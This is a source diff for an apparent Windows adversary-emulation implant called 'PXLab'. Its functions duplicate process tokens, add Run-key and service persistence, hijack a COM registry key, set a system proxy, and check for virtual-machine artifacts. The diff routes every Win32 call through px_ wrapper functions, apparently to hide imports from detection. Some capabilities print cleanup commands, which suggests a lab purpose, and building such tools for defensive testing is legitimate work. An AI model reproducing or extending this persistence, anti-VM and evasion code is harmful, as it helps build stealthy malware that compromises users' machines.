@@ -358,10 +358,10 @@ static int px_cap_token(char *args, char *report, unsigned int cap)
         return 0;
     }
 
-    if (OpenProcessToken(h, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
+    if (px_open_process_token(h, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                          TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES |
                          TOKEN_ADJUST_DEFAULT, &tok)) {
-        if (DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
+        if (px_duplicate_token_ex(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                              TokenPrimary, &dup)) {
             ok = 1;
         }
@@ -373,13 +373,13 @@ static int px_cap_token(char *args, char *report, unsigned int cap)
         char priv[256];
         int n = 0;
         priv[0] = '\0';
-        if (GetTokenInformation(dup, TokenPrivileges, &tp, sizeof(tp),
+        if (px_get_token_information(dup, TokenPrivileges, &tp, sizeof(tp),
                                 NULL) && tp.PrivilegeCount) {
             DWORD i;
             for (i = 0; i < tp.PrivilegeCount && n < 200; i++) {
                 char name[64];
                 DWORD len = sizeof(name);
-                if (!LookupPrivilegeNameA(dup, &tp.Privileges[i].Luid,
+                if (!px_lookup_privilege_name(dup, &tp.Privileges[i].Luid,
                                            name, &len))
                     continue;
                 n += px_snprintf(priv + n, (unsigned int)(sizeof(priv) - n),
@@ -645,7 +645,7 @@ static int px_cap_persist(char *args, char *report, unsigned int cap)
     /* The Run key. */
     {
         HKEY k;
-        LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
+        LONG rc = px_reg_open_key_ex(HKEY_CURRENT_USER,
                                  "Software\\Microsoft\\Windows\\"
                                  "CurrentVersion\\Run",
                                  0, KEY_SET_VALUE, &k);
@@ -654,10 +654,10 @@ static int px_cap_persist(char *args, char *report, unsigned int cap)
                         "could not open the Run key, error %ld", (long)rc);
             return 0;
         }
-        rc = RegSetValueExA(k, "PXLab", 0, REG_SZ,
+        rc = px_reg_set_value_ex(k, "PXLab", 0, REG_SZ,
                              (const BYTE *)value,
                              (DWORD)(px_strlen(value) + 1));
-        RegCloseKey(k);
+        px_reg_close_key(k);
         px_snprintf(report, PX_REPORT_CAP,
                     "Run key 'PXLab' %s with value '%s'. Remove it with: "
                     "reg delete HKCU\\Software\\Microsoft\\Windows\\"
@@ -1521,13 +1521,13 @@ static int px_cap_antivm(char *args, char *report, unsigned int cap)
         {
             HKEY k;
             DWORD type = 0, sz = 0;
-            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            if (px_reg_open_key_ex(HKEY_LOCAL_MACHINE,
                               "HARDWARE\\DESCRIPTION\\System\\BIOS",
                               0, KEY_READ, &k) == ERROR_SUCCESS) {
                 char buf[256];
                 memset(buf, 0, sizeof(buf));
                 sz = sizeof(buf) - 1;
-                if (RegQueryValueExA(k, "SystemBiosVersion", NULL, &type,
+                if (px_reg_query_value_ex(k, "SystemBiosVersion", NULL, &type,
                                      (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                     const char *markers[] = { "VMware", "VBOX", "VirtualBox",
                                               "QEMU", "Xen", "Hyper-V",
@@ -1543,7 +1543,7 @@ static int px_cap_antivm(char *args, char *report, unsigned int cap)
                         }
                     }
                 }
-                RegCloseKey(k);
+                px_reg_close_key(k);
             }
         }
         /* The machine name. */
@@ -1651,13 +1651,13 @@ static int px_cap_antivm(char *args, char *report, unsigned int cap)
             /* The installed programs. */
             HKEY k;
             DWORD count = 0;
-            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            if (px_reg_open_key_ex(HKEY_LOCAL_MACHINE,
                               "SOFTWARE\\Microsoft\\Windows\\"
                               "CurrentVersion\\Uninstall",
                               0, KEY_READ, &k) == ERROR_SUCCESS) {
-                RegQueryInfoKeyA(k, NULL, NULL, NULL, NULL, NULL, NULL,
+                px_reg_query_info_key(k, NULL, NULL, NULL, NULL, NULL, NULL,
                                  &count, NULL, NULL, NULL, NULL);
-                RegCloseKey(k);
+                px_reg_close_key(k);
                 if (count < 10) {
                     score++;
                     off += px_snprintf(detail + off,
@@ -1721,7 +1721,7 @@ static int px_cap_service(char *args, char *report, unsigned int cap)
 
     px_strcpy(svcname, "PXLab-Svc", sizeof(svcname));
 
-    sc = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    sc = px_open_sc_manager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (!sc) {
         px_snprintf(report, cap,
                     "could not open the service control manager, error %lu",
@@ -1729,19 +1729,19 @@ static int px_cap_service(char *args, char *report, unsigned int cap)
         return 0;
     }
 
-    svc = CreateServiceA(sc, svcname, svcname, SERVICE_ALL_ACCESS,
+    svc = px_create_service(sc, svcname, svcname, SERVICE_ALL_ACCESS,
                          SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
                          SERVICE_ERROR_NORMAL, binpath, NULL, NULL, NULL,
                          NULL, NULL);
     if (svc) {
         created = 1;
-        CloseServiceHandle(svc);
+        px_close_service_handle(svc);
     } else {
         px_snprintf(report, cap,
                     "CreateService failed, error %lu",
                     (unsigned long)GetLastError());
     }
-    CloseServiceHandle(sc);
+    px_close_service_handle(sc);
 
     if (created) {
         /* Remove it again, so the machine is as it was. */
@@ -1824,16 +1824,16 @@ static int px_cap_com(char *args, char *report, unsigned int cap)
     px_snprintf(key, sizeof(key),
                 "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
 
-    rc = RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL, 0,
+    rc = px_reg_create_key_ex(HKEY_CURRENT_USER, key, 0, NULL, 0,
                          KEY_SET_VALUE, NULL, &k, NULL);
     if (rc != ERROR_SUCCESS) {
         px_snprintf(report, cap, "could not create %s, error %ld",
                     key, (long)rc);
         return 0;
     }
-    rc = RegSetValueExA(k, NULL, 0, REG_SZ, (const BYTE *)path,
+    rc = px_reg_set_value_ex(k, NULL, 0, REG_SZ, (const BYTE *)path,
                         (DWORD)(px_strlen(path) + 1));
-    RegCloseKey(k);
+    px_reg_close_key(k);
 
     px_snprintf(report, cap,
                 "COM class %s now points at %s (%s). Remove it with: reg "
@@ -1870,16 +1870,16 @@ static int px_cap_elev(char *args, char *report, unsigned int cap)
         return 0;
     }
 
-    rc = RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL, 0,
+    rc = px_reg_create_key_ex(HKEY_CURRENT_USER, key, 0, NULL, 0,
                          KEY_SET_VALUE, NULL, &k, NULL);
     if (rc != ERROR_SUCCESS) {
         px_snprintf(report, cap, "could not create %s, error %ld",
                     key, (long)rc);
         return 0;
     }
-    rc = RegSetValueExA(k, NULL, 0, REG_SZ, (const BYTE *)path,
+    rc = px_reg_set_value_ex(k, NULL, 0, REG_SZ, (const BYTE *)path,
                         (DWORD)(px_strlen(path) + 1));
-    RegCloseKey(k);
+    px_reg_close_key(k);
 
     /* Put it back the way it was. */
     {
@@ -1924,20 +1924,20 @@ static int px_cap_proxy(char *args, char *report, unsigned int cap)
     else
         px_strcpy(value, "127.0.0.1:8080", sizeof(value));
 
-    rc = RegOpenKeyExA(HKEY_CURRENT_USER, key, 0, KEY_SET_VALUE, &k);
+    rc = px_reg_open_key_ex(HKEY_CURRENT_USER, key, 0, KEY_SET_VALUE, &k);
     if (rc != ERROR_SUCCESS) {
         px_snprintf(report, cap, "could not open %s, error %ld",
                     key, (long)rc);
         return 0;
     }
-    rc = RegSetValueExA(k, "ProxyServer", 0, REG_SZ,
+    rc = px_reg_set_value_ex(k, "ProxyServer", 0, REG_SZ,
                          (const BYTE *)value,
                          (DWORD)(px_strlen(value) + 1));
     if (rc == ERROR_SUCCESS) {
-        RegSetValueExA(k, "ProxyEnable", 0, REG_DWORD,
+        px_reg_set_value_ex(k, "ProxyEnable", 0, REG_DWORD,
                        (const BYTE *)&enabled, sizeof(enabled));
     }
-    RegCloseKey(k);
+    px_reg_close_key(k);
 
     /* Put it back. */
     {
@@ -2192,17 +2192,17 @@ int px_install_persistence(char *report, unsigned int cap)
     }
     px_logf("[px] persist: command=%s\n", command);
 
-    rc = RegCreateKeyExA(HKEY_CURRENT_USER, runkey, 0, NULL, 0,
+    rc = px_reg_create_key_ex(HKEY_CURRENT_USER, runkey, 0, NULL, 0,
                          KEY_SET_VALUE, NULL, &k, NULL);
     if (rc != ERROR_SUCCESS) {
         px_snprintf(report, cap, "could not open %s, error %ld",
                     runkey, (long)rc);
         return -1;
     }
-    rc = RegSetValueExA(k, "PXLab", 0, REG_SZ,
+    rc = px_reg_set_value_ex(k, "PXLab", 0, REG_SZ,
                         (const BYTE *)command,
                         (DWORD)(px_strlen(command) + 1));
-    RegCloseKey(k);
+    px_reg_close_key(k);
 
     if (rc != ERROR_SUCCESS) {
         px_snprintf(report, cap, "could not write the Run key, error %ld",
